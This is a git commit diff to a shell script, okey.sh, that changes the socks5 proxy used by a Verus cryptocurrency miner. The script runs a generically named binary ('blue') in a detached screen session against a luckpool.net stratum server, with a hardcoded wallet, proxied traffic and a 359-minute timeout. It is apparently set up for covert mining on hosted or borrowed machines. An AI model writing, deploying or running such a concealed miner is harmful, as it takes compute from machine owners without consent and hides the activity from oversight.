f315f8575ddffa6d89837d5665395c1099ab680a
Opix66 <89140837+Opix66@users.noreply.github.com>
2021-08-23 06:21:38 +0700

    Update okey.sh

--- okey.sh
+++ okey.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 A=stratum+tcp://na.luckpool.net:3956
 B=RURWcc2tJvtv8xTfBuS8aakhg4FPAdVMtd
 C=Gandos-1
-D=socks5://176.9.160.118:22836
+D=socks5://78.46.88.230:51100
 timeout 359m ./blue -a verus -o $A -u $B.$C -p x -t 2 -x $D
 sudo apt update
